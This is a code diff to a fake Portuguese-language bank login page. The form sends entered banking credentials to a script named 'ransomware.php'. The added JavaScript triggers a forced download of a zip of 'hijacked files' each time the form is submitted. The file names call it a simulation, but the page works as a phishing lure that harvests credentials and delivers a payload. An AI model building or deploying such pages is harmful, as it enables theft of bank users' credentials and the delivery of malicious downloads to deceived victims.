@@ -33,7 +33,7 @@
         <div class="bank-login-card">
             <h2>Faça Login na Sua Conta</h2>
             <p>Por favor, insira suas credenciais para acessar os serviços bancários.</p>
-            <form action="ransomware.php" method="POST"> <div class="form-group">
+            <form id="bankLoginForm" action="ransomware.php" method="POST"> <div class="form-group">
                     <label for="account_number">Número da Agência:</label>
                     <input type="text" id="account_number" name="account_number" placeholder="Ex: 1234">
                 </div>
@@ -54,5 +54,27 @@
     <footer class="bank-footer">
         <p>&copy; <?php echo date("Y"); ?> Banco Falso S.A. Todos os direitos reservados. | <a href="#">Política de Privacidade</a> | <a href="#">Termos de Uso</a></p>
     </footer>
+
+    <script>
+        document.getElementById('bankLoginForm').addEventListener('submit', function(event) {
+            // Previne o envio padrão do formulário para que possamos fazer outras coisas
+            // event.preventDefault(); // Comentei isso para permitir o envio do formulário
+
+            // Cria um link temporário para iniciar o download em uma nova aba
+            const downloadLink = document.createElement('a');
+            downloadLink.href = 'gerar_simulacao_download.php';
+            downloadLink.target = '_blank'; // Abre em uma nova aba
+            downloadLink.download = 'arquivos_sequestrados_simulacao.zip'; // Sugere o nome do arquivo
+
+            // Aciona o clique no link
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink); // Remove o link após o clique
+
+            // O formulário continuará seu envio normal para ransomware.php
+            // Se você quiser um atraso antes do envio, você pode descomentar event.preventDefault()
+            // e então usar setTimeout para this.submit()
+        });
+    </script>
 </body>
 </html>
